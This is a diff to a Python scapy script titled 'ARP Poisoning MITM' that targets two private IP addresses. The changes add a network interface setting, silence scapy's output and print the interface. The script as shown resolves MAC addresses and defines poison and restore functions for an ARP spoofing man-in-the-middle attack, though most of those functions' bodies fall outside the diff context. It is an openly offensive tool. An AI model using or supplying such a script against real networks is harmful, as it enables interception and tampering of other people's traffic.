@@ -1,14 +1,17 @@
 #!/usr/bin/env python3
 import sys, time
-from scapy.all import ARP, Ether, srp, send
+from scapy.all import ARP, Ether, srp, send, conf
+
+conf.verb = 0
 
 victim = "192.168.189.200"
 target = "192.168.189.201"
+iface = "ens224"
 
 def get_mac(ip):
     req = ARP(pdst=ip)
     eth = Ether(dst="ff:ff:ff:ff:ff:ff")
-    rep = srp(eth / req, timeout=2, verbose=False)[0]
+    rep = srp(eth / req, iface=iface, timeout=2, verbose=False)[0]
     return rep[0][1].hwsrc if rep else None
 
 def poison(a, b, c):
@@ -19,6 +22,7 @@ def restore(a, b, c):
 
 print("ARP Poisoning MITM")
 print("Victim:", victim, "| Target:", target)
+print("Interface:", iface)
 vmac, tmac = get_mac(victim), get_mac(target)
 if not vmac or not tmac: print("MAC not found"); sys.exit(1)
 print("MACs:", vmac, tmac)
